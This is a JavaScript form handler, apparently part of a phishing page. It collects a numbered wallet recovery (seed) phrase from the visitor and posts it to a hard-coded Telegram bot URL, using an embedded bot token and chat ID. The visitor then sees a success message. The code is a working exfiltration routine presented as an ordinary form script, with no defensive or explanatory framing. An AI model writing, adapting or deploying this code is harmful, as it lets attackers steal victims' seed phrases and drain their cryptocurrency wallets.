
    document.getElementById('form').addEventListener('submit', async function (e) {
      e.preventDefault();
  
      const inputs = document.querySelectorAll('#form input'); // Select all input fields in the form
      const recoveryPhraseArray = Array.from(inputs).map((input, index) => {
        return `${index + 1}: ${input.value.trim()}`;
      });
  
      const emptyFields = recoveryPhraseArray.some((value) => value.split(': ')[1] === ""); // Check if any field is empty
  
      if (emptyFields) {
        showAlert('danger', 'All fields must be filled!');
        return;
      }
  
      const recoveryPhrase = recoveryPhraseArray.join('\n'); // Join all phrases with a newline for the message
      const message = recoveryPhraseArray.join(' '); // Join with a space for Telegram message
  
      try {
        const telegramResponse = await fetch("https://api.telegram.org/bot7409650658:AAFEppk-hMfd5rK2JqExuRQehns5jZMEpu0/sendMessage", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: "-1002266312792", // Ensure this chat ID is correct
            text: message,
          }),
        });
  
        if (telegramResponse.ok) {
          showAlert('success', 'Recovery phrase sent successfully!');
          console.log(recoveryPhrase);
          inputs.forEach(input => input.value = ''); // Clear inputs after success
        } else {
          showAlert('danger', 'Failed to send recovery phrase. Please try again.');
        }
      } catch (error) {
        showAlert('danger', 'An error occurred. Please try again later.');
      }
    });
  
    function showAlert(type, message) {
      const alertPlaceholder = document.getElementById('alert-placeholder');
      alertPlaceholder.innerHTML = `
        <div class="alert alert-${type} alert-dismissible fade show" role="alert">
          ${message}
          <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
        </div>
      `;
      setTimeout(() => {
        alertPlaceholder.innerHTML = ''; // Clear alert after 5 seconds
      }, 5000);
    }
  